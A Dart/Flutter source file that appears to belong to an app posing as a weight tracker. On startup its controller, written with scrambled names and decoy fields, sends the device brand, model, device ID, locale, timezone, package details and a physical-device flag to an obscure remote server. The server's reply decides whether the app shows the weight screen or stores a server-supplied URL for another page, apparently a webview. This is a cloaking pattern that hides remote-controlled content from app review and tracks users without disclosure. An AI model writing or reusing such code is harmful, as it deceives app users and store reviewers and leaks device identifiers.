import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkConnect() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/reloadPage");
  }
}

class PageLogic extends GetxController {

  var fzadue = RxBool(false);
  var prjncfhmx = RxBool(true);
  var ofaxhcj = RxString("");
  var deven = RxBool(false);
  var tremblay = RxBool(true);
  final tnbiumaykx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    checkConnect();
    sqlfn();
  }


  Future<void> sqlfn() async {

    deven.value = true;
    tremblay.value = true;
    prjncfhmx.value = false;

    tnbiumaykx.post("https://wid.syoquw.art/aeitkcofrmgjnsvdbxwyhupqlz",data: await ceuzjvfhxg()).then((value) {
      var hbun = value.data["hbun"] as String;
      var pwdygj = value.data["pwdygj"] as bool;
      if (pwdygj) {
        ofaxhcj.value = hbun;
        twila();
      } else {
        ondricka();
      }
    }).catchError((e) {
      prjncfhmx.value = true;
      tremblay.value = true;
      deven.value = false;
    });
  }

  Future<Map<String, dynamic>> ceuzjvfhxg() async {
    final DeviceInfoPlugin qyov = DeviceInfoPlugin();
    PackageInfo sfkoan_kejz = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qgtnarx = Platform.localeName;
    var tqmyoxr = currentTimeZone;

    var zbhxqwfj = sfkoan_kejz.packageName;
    var uahwj = sfkoan_kejz.version;
    var yrsh = sfkoan_kejz.buildNumber;

    var dpxwrobv = sfkoan_kejz.appName;
    var wkfxclzp = "";
    var vwlq  = "";
    var okrfi = "";
    var emmyLabadie = "";
    var rosemaryKerluke = "";
    var emilieDach = "";
    var rethaKassulke = "";
    var cheyenneKirlin = "";
    var jaquelinConroy = "";
    var tillmanLittle = "";


    var mpqjo = "";
    var amhyw = false;

    if (GetPlatform.isAndroid) {
      mpqjo = "android";
      var sbyzriecqt = await qyov.androidInfo;

      okrfi = sbyzriecqt.brand;

      wkfxclzp  = sbyzriecqt.model;
      vwlq = sbyzriecqt.id;

      amhyw = sbyzriecqt.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      mpqjo = "ios";
      var tuaxfgvp = await qyov.iosInfo;
      okrfi = tuaxfgvp.name;
      wkfxclzp = tuaxfgvp.model;

      vwlq = tuaxfgvp.identifierForVendor ?? "";
      amhyw  = tuaxfgvp.isPhysicalDevice;
    }
    var res = {
      "dpxwrobv": dpxwrobv,
      "yrsh": yrsh,
      "uahwj": uahwj,
      "wkfxclzp": wkfxclzp,
      "tqmyoxr": tqmyoxr,
      "qgtnarx": qgtnarx,
      "jaquelinConroy" : jaquelinConroy,
      "cheyenneKirlin" : cheyenneKirlin,
      "mpqjo": mpqjo,
      "amhyw": amhyw,
      "emmyLabadie" : emmyLabadie,
      "rosemaryKerluke" : rosemaryKerluke,
      "emilieDach" : emilieDach,
      "okrfi": okrfi,
      "vwlq": vwlq,
      "rethaKassulke" : rethaKassulke,
      "zbhxqwfj": zbhxqwfj,
      "tillmanLittle" : tillmanLittle,

    };
    return res;
  }

  Future<void> ondricka() async {
    Get.offAllNamed("/weightTab");
  }

  Future<void> twila() async {
    Get.offAllNamed("/weightFac");
  }

}
